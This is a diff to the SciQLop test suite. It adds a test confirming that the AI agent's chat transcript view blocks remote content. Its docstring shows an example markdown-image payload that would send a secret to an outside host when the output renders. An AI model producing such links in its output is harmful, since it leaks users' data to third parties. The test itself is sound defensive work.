@@ -300,3 +300,13 @@ def test_settings_notifier_triggers_the_live_swap(dock, qtbot):
 def test_new_configs_default_to_the_web_transcript():
     from SciQLop.components.agents.settings import AgentChatSettings
     assert AgentChatSettings.model_fields["transcript_renderer"].default == "web"
+
+
+def test_the_transcript_page_cannot_load_remote_content():
+    """Agent output is untrusted: a markdown image ![](https://host/?q=secret)
+    would otherwise be fetched as soon as it renders (checked live against a
+    local HTTP server). The app store keeps remote access for screenshots."""
+    from SciQLop.components.agents.chat.web_view import WebTranscriptView
+    from SciQLop.components.appstore.web_appstore_page import AppStorePage
+    assert WebTranscriptView.allows_remote_content is False
+    assert AppStorePage.allows_remote_content is True
